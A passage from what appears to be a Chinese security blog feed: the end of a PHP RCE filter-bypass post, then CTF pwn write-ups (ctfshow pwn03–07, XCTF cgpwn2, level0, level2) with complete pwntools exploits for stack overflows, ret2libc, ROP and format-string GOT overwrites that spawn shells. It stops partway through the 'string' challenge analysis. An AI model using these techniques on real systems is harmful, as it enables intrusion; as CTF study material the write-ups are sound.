class="variable">$code</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$c</span> = <span class="variable">$code</span>[<span class="variable">$i</span>];</span><br><span class="line">                 <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;<span class="number">97</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;<span class="number">122</span>)&#123;</span><br><span class="line">                         <span class="variable">$ret</span> .= <span class="string">&quot;<span class="subst">$c</span>&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                         <span class="variable">$ret</span> .= <span class="string">&#x27;$&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)-<span class="number">96</span>); </span><br><span class="line">                 &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;precode(\&quot;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$ret</span>,<span class="number">0</span>,<span class="title function_ invoke__">stripos</span>(<span class="variable">$ret</span>, <span class="string">&quot;(&quot;</span>)).<span class="string">&quot;\&quot;)&quot;</span>).str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">createCode</span>(<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h1><p>具体原理可以看p神文章</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>


<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>除这些之外我们还可以这样用$</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>奇技淫巧</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-PWN部分题</title>
    <url>/PWN/ctfshow%E9%83%A8%E5%88%86PWN%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随手玩了下，就随手写个WP。</p>
<span id="more"></span>

<h1 id="ctfshow-pwn03"><a href="#ctfshow-pwn03" class="headerlink" title="ctfshow-pwn03"></a>ctfshow-pwn03</h1><p>分析一下附件：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_IcUtzNnPDQ.png"></p>
<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_cGpj3tpkkZ.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gBccWcEN1U.png"></p>
<p>pwnme函数出fgets接受100个字节，但是s只开辟了9个字节.<code>存在栈溢出</code> 。</p>
<p>接着就是找到<code>system函数</code>的位置了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gW1afFLyLC.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_GI01GR64v2.png"></p>
<p>但是都没有发现<code>system函数</code>和<code>&#39;/bin/sh&#39;</code> 。</p>
<p>经过一番研究之后，要用到<code>plt表</code>和<code>got表</code></p>
<h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><ul>
<li><p>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址 &amp;#x20;</p>
</li>
<li><p>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</p>
</li>
<li><p>延迟绑定：只有动态库函数在被调用时，才会地址解析和重定位工作</p>
</li>
<li><p>程序执行后，plt表里是got表的地址，got表是函数的真实地址 &amp;#x20;</p>
</li>
<li><p>程序还未执行时，got表里还是plt表的地址</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_HTib7wBlVm.png"></p>
<p>由上可知，需要泄露got表里面的地址，但是由于开启了ASLR<code>本地和远程的地址不一样</code>。</p>
<p>但也只是针对于地址中间位进行随机，最低的12位并不会发生改变；</p>
<p>也就是需要获取到远程环境的函数的真实地址；</p>
<p>进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与&#x2F;bin&#x2F;sh的偏移，最终getshell</p>
<h2 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h2><p>首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_meZGx1HRox.png"></p>
<p>得到system函数的真实地址<code>0xf7e274e0</code></p>
<p>传两个<code>\n\n</code> 原因是u32是将字符转换为小端序。</p>
<p>当知道了<code>puts函数的真实地址</code>之后就可以<code>根据后三位判断libc的版本</code></p>
<p><a href="https://libc.blukat.me/" title="Libc">Libc</a></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_F63vef98Uk.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>完整EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br><span class="line"></span><br><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_VNcHQCRYWk.png"></p>
<h1 id="ctfshow-pwn04"><a href="#ctfshow-pwn04" class="headerlink" title="ctfshow-pwn04"></a>ctfshow-pwn04</h1><p>关键点绕canary</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_JUsZ5bUO6p.png"></p>
<p>打开了canary，栈不可执行。</p>
<p>canary的原理是：在栈的ebp下面放一个随机数，<strong>在函数返回之前会检查这个数有没有被修改</strong>，就可以检测是否发生栈溢出了，因此 <code>在一个函数最后位置对ebp的操作，就是canary做的操作。</code></p>
<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_hRIPLi0k50.png"></p>
<p>printf函数没有格式化输出，很好字符串格式化漏洞出来了。</p>
<p>可以<strong>将printf函数的got表地址修改为system函数的内存地址</strong>，结果是当程序执行到printf函数时，其实是执行的system函数，而程序正好有两次输入输出，可以在第一次输入时篡改printf函数，到第二次输入时，我们只用传进去<code>/bin/sh</code>，那么程序在执行<code>printf(&amp;buf)</code>时，实际执行的却是<code>system(&#39;/bin/sh&#39;)</code>。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./ex2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">b&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28110</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ex2&quot;</span>)</span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Hacker!\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh\n&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_YAVR191ejr.png"></p>
<h1 id="ctfshow-pwn05"><a href="#ctfshow-pwn05" class="headerlink" title="ctfshow-pwn05"></a>ctfshow-pwn05</h1><p>经典栈溢出，直接给EXP了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./ex2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">b&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28061</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;getFlag&#x27;</span>]</span><br><span class="line"><span class="comment"># system = 0x8048486</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x14</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + p32(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ctfhsow-pwn06"><a href="#ctfhsow-pwn06" class="headerlink" title="ctfhsow-pwn06"></a>ctfhsow-pwn06</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">b&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28086</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">system = <span class="number">0x40057B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ctfhsow-pwn07"><a href="#ctfhsow-pwn07" class="headerlink" title="ctfhsow-pwn07"></a>ctfhsow-pwn07</h1><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Jqtie_4qsh.png"></p>
<p>明显栈溢出，思路与之前一样先得到libc版本，推算出<code>system</code>和<code>/bin/sh</code>的地址</p>
<p>此时要注意64位要返回地址是<code>pop rdi；red</code> ,因为64位程序要考虑堆栈平衡。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1YTsZe1U1l.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_aU7GzL5gr5.png"></p>
<h2 id="得到libc"><a href="#得到libc" class="headerlink" title="得到libc"></a>得到libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span></span><br><span class="line">pop_ret = <span class="number">0x4004c6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xC</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>

<p>根据打印出来的结果的后三位</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_GPmg3pBLU1.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_m6LChvaAOJ.png"></p>
<p>由此得到后半部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span></span><br><span class="line">pop_ret = <span class="number">0x4004c6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xC</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PHTPHtqql_.png"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界部分PWN题</title>
    <url>/PWN/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94PWN%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随手玩了下，就随手写个WP。</p>
<span id="more"></span>

<h1 id="攻防世界—cgpwn2"><a href="#攻防世界—cgpwn2" class="headerlink" title="攻防世界—cgpwn2"></a>攻防世界—cgpwn2</h1><p>对附件做一个分析</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_lRKaqFqqJr.png"></p>
<p>32位程序</p>
<h2 id="防护机制"><a href="#防护机制" class="headerlink" title="防护机制"></a>防护机制</h2><h3 id="ASLR-Address-space-layout-randomization，地址空间布局随机化"><a href="#ASLR-Address-space-layout-randomization，地址空间布局随机化" class="headerlink" title="ASLR (Address space layout randomization，地址空间布局随机化)"></a>ASLR (Address space layout randomization，地址空间布局随机化)</h3><p>在windows上ASLR主要包括<code>堆栈随机化</code>、<code>PEB</code>（Process Envirorment Block Structure进程环境信息块）与<code>TEB</code>（线程环境快）、<code>映像随机化</code>,windows系统从vista开始ASLR才真正发挥作用。 &amp;#x20;</p>
<p>在linux上ASLR主要包括<code>栈地址随机化</code>、<code>LIBS/MMAP随机化、EXEC随机化、BRK随机化、VDSO随机化</code>。在没有ASLR的情况下让程序跳转到一个已经存在的系统函数的漏洞利用方式被称为<code>ret2libc</code>。 &amp;#x20;</p>
<p>在linux系统中<code>ASLR被分为0，1，2三个等级</code>，可以通过<code>sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;设置</code>。 &amp;#x20;<br>0：没有随机化。即关闭ASLR。 &amp;#x20;<br>1：保留的随机化。共享库、栈、mmap()分配的内存空间以及VDSO将被随机化。 &amp;#x20;<br>2：完全的随机化。在1的基础上，通过 brk()分配的内存空间也将被随机化。</p>
<h3 id="NX-Non-Executable-Memory，不可执行内存"><a href="#NX-Non-Executable-Memory，不可执行内存" class="headerlink" title="NX(Non-Executable Memory，不可执行内存)"></a>NX(Non-Executable Memory，不可执行内存)</h3><p>类似于DEP，数据执行保护。</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE只有在系统开启ASLR和编译时开启-fpie-pie选项这两个条件同时满足时才会生效。</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO(RELocation Read-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆写攻击的面积。RELRO可以分为Partial RELRO(部分RELRO)和Full RELRO(完整RELRO)。开启Partial RELRO的话GOT表是可写的；开启FULL RELRO的话GOT表是只读的。</p>
<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack Protector又名canary，stack cookie……等等，类似于VS编译器中的GS。</p>
<h2 id="用32位IDA打开附件"><a href="#用32位IDA打开附件" class="headerlink" title="用32位IDA打开附件"></a>用32位IDA打开附件</h2><p>pwn函数中的system无法利用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PgBpWYFlvO.png"></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>shift+f12查找字符串并没有发现&#x2F;bin&#x2F;sh，可能需要自己整，或者藏在某个变量里。</p>
<p>在函数列表里找到了真正的_system，括号内的command似乎是输入，这里插留坑。地址是<code>0x804A0C8</code></p>
<p>要自己构建执行命令，有个条件：</p>
<p>要求执行的命令在一个固定的地址上，且可以读取写入。</p>
<p>题中第一个输入的变量存在name中，<strong>而name标蓝代表全局变量</strong>。</p>
<ul>
<li><p>name再<code>.bss</code>段上，还未初始化，但地址也是固定的</p>
</li>
<li><p>name前可以看到这一部分的.bss段<code>具有可读写属性</code></p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_jssWUMAemO.png"></p>
<p>由此构建EXP</p>
<p>利用第一个输入，写我们想要执行的命令，eg： &#x2F;bin&#x2F;sh</p>
<p>利用第二个输入的gets进行栈溢出，拼接出 system &#x2F;bin&#x2F;sh：</p>
<ul>
<li><p>先将字符串s填满在把s的栈地址填满，将返回地址改成system地址</p>
</li>
<li><p>再填四字节无用地址堵住system的返回地址，至于为什么要用四，是因为他的长度为四</p>
</li>
<li><p>然后缝合上之前输入的&#x2F;bin&#x2F;sh的地址</p>
</li>
</ul>
<p>python3中需要把所有都转化为字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">63983</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn006&quot;)</span></span><br><span class="line">binsh = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">system = <span class="number">0x8048420</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x26</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(name)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please tell me your name&quot;</span>,binsh)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;hello,you can leave some message here:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PKhu5FLnGF.png"></p>
<p>如果用<code>/bin/sh</code> 要在Linux下，因为对方主机是Linux的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_uKsv24Nb9b.png"></p>
<h1 id="攻防世界—level0"><a href="#攻防世界—level0" class="headerlink" title="攻防世界—level0"></a>攻防世界—level0</h1><p>先下载附件分析一下。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_k_BI6Ta-qA.png"></p>
<p>64位程序，未开启Stack典型的栈溢出了。</p>
<p><code>shift+f12</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_xd-8KGQXy8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_OglOior0aR.png"></p>
<p>在按x寻找入口函数。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_tjf9P5rDTW.png"></p>
<p>开始地址是<code>400596</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gvJAShSN9w.png"></p>
<p><code>vulnerable_function()</code> 函数中的buf只有80位。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_CbfulmGFKj.png"></p>
<p>却可以输入200位。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PTOhSaIC9b.png"></p>
<p>存在栈溢出。返回地址r是8字节。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_4BKYFn7R5a.png"></p>
<p>由此构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">57658</span>)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(callsystem)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hello, World\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_WRfJIt7opO.png"></p>
<h1 id="攻防世界—leve2"><a href="#攻防世界—leve2" class="headerlink" title="攻防世界—leve2"></a>攻防世界—leve2</h1><p>流程和上一题没差多少，所以直接给EXP了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">62163</span>)</span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">bin_s = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="攻防世界-string"><a href="#攻防世界-string" class="headerlink" title="攻防世界-string"></a>攻防世界-string</h1><p>老规矩，先分析一下文件</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_wx8iYZ7bh3.png"></p>
<p>分析了很多次就不多说了。</p>
<p>然后用64位IDA打开，从题目名字可猜测，是一道格式化字符串漏洞的题，所以等下<code>print()</code>着重看一下。</p>
<p>可以在Linux中先将程序跑一遍，对程序的流程和分支有个大概了解。本题是个简单的<code>D&amp;D类型题目</code>。</p>
<p>用IDA对程序进行分析，顺着程序的流程走，可以看到在<code>sub_400BB9</code>中有<code>printf(&amp;format, &amp;format)</code>语句，存在格式化字符串漏洞。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QRWZ87gqzD.png"></p>
<p>此外，在函数<code>sub_400CA6</code>中，可以发现<code>_QWORD</code>的分支有命令执行的语句，可以直接执行外部输入的命令。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Bn83Rw2Nf3.png"></p>
<p>因此，本题的关键在于，如何利用格式化字符串漏洞，让程序的控制流进入到命令执行语句；也就是说，进入<code>sub_400CA6</code>函数中，且满足<code>*a == a1[1]</code>的条件。</p>
<p>IDA进行具体分析：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_m1EVc4Vam2.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_tuBTSmuzG_.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_V1WBvV-tGS.png"></p>
